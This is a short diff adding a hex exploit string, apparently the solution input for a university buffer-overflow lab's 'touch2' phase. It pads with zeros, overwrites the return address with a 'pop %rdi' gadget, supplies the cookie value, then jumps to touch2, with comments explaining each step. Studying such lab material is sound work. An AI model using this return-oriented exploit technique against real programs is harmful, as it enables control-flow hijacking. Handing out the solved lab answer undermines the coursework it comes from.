@@ -1,0 +1,8 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+1b 14 40 00 00 00 00 00 /* gadget 1, pop %rdi, ret, cover the old return address */ 
+fa 97 b9 59 00 00 00 00 /* data 0x59b997fa, will be saved in %rdi according to gadget1 */
+ec 17 40 00 00 00 00 00 /* gadget 2, the address of touch2 */
